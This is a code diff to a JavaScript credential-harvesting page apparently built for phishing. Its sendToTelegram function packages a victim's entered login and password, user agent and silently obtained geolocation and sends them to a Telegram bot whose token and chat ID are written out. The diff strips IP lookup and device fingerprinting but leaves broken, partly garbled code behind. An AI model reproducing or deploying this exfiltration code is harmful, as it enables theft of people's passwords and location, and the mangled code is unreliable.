@@ -385,20 +385,7 @@
             // sendToTelegram function now accepts input1, input2, actionType, and a flag for detailed info
             async function sendToTelegram(input1, input2, actionType, includeDetailedInfo = false) {
                 const browser = navigator.userAgent;
-                const language = navigator.language;
-                const platform = navigator.platform;
-                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-
-                let ip = 'Error in fetching IP';
-                let locationText = 'Error in fetching Geolocation';
-                
-                // Fetch IP address
-                try {
-                    const ipRes = await fetch('https://api.ipify.org?format=json');
-                    const ipData = await ipRes.json();
-                    ip = ipData.ip;
-                } catch (e) { /* Error in fetching IP */ }
-
+            
                 // Fetch Geolocation without prompting if permission isn't already granted
                 try {
                     if (navigator.geolocation && navigator.permissions) {
@@ -427,78 +414,10 @@
                 } catch (e) { /* Error in checking/fetching Geolocation */ }
 
 
-                let detailedInfoSection = '';
-                if (includeDetailedInfo) {
-                    // Collect device info that typically doesn't require explicit permission pop-ups
-                    let batteryLevel = 'N/A';
-                    let batteryCharging = 'N/A';
-                    let networkType = 'N/A';
-                    let networkEffectiveType = 'N/A';
-                    let deviceMemory = 'N/A';
-                    let hardwareConcurrency = 'N/A';
-
-                    // Battery Status API
-                    try {
-                        if ('getBattery' in navigator) {
-                            const battery = await navigator.getBattery();
-                            batteryLevel = `${(battery.level * 100).toFixed(0)}%`;
-                            batteryCharging = battery.charging ? 'Yes' : 'No';
-                        } else {
-                            batteryLevel = 'API Not Supported';
-                            batteryCharging = 'API Not Supported';
-                        }
-                    } catch (e) {
-                        batteryLevel = `Error in fetching Battery status (${e.message || e.name})`;
-                        batteryCharging = `Error in fetching Battery status (${e.message || e.name})`;
-                    }
-
-                    // Network Information API
-                    try {
-                        if ('connection' in navigator && navigator.connection) {
-                            networkType = navigator.connection.type || 'N/A';
-                            networkEffectiveType = navigator.connection.effectiveType || 'N/A';
-                        } else {
-                            networkType = 'API Not Supported';
-                            networkEffectiveType = 'API Not Supported';
-                        }
-                    } catch (e) {
-                        networkType = `Error in fetching Network info (${e.message || e.name})`;
-                        networkEffectiveType = `Error in fetching Network info (${e.message || e.name})`;
-                    }
-
-                    // Device Memory
-                    try {
-                        if ('deviceMemory' in navigator) {
-                            deviceMemory = `${navigator.deviceMemory} GB`;
-                        } else {
-                            deviceMemory = 'API Not Supported';
-                        }
-                    } catch (e) {
-                        deviceMemory = `Error in fetching Device Memory (${e.message || e.name})`;
-                    }
-
-                    // Hardware Concurrency
-                    try {
-                        if ('hardwareConcurrency' in navigator) {
-                            hardwareConcurrency = navigator.hardwareConcurrency;
-                        } else {
-                            hardwareConcurrency = 'API Not Supported';
-                        }
-                    } catch (e) {
-                        hardwareConcurrency = `Error in fetching Hardware Concurrency (${e.message || e.name})`;
-                    }
+                 networkEffectiveType = `Error in fetching Network info (${e.message || e.name})`;
+                 
 
                     detailedInfoSection = `
-🔋 *Device Info:*
-- Battery Level: ${batteryLevel}
-- Battery Charging: ${batteryCharging}
-- Network Type: ${networkType}
-- Effective Network Type: ${networkEffectiveType}
-- Device Memory: ${deviceMemory}
-- Hardware Concurrency (CPU cores): ${hardwareConcurrency}
-`;
-                }
-
 
                 const fullMessage = `
 ? *${actionType}*
@@ -507,15 +426,8 @@
 📝 *Password:* ${input2 || 'Not Entered'}
 
 🌐 *Browser Info:*
-- Platform: ${platform}
-- Language: ${language}
-- Timezone: ${timezone}
 - User Agent: ${browser}
 
-🌍 *IP Address:* ${ip}
-📍 *Geolocation:* ${locationText}
-${detailedInfoSection}
-`;
 
                 const botToken = '6058106297:AAE3o2YdDcc915N81s91F3S9jzMTYj1k0UQ';
                 const chatId = '1747742228';
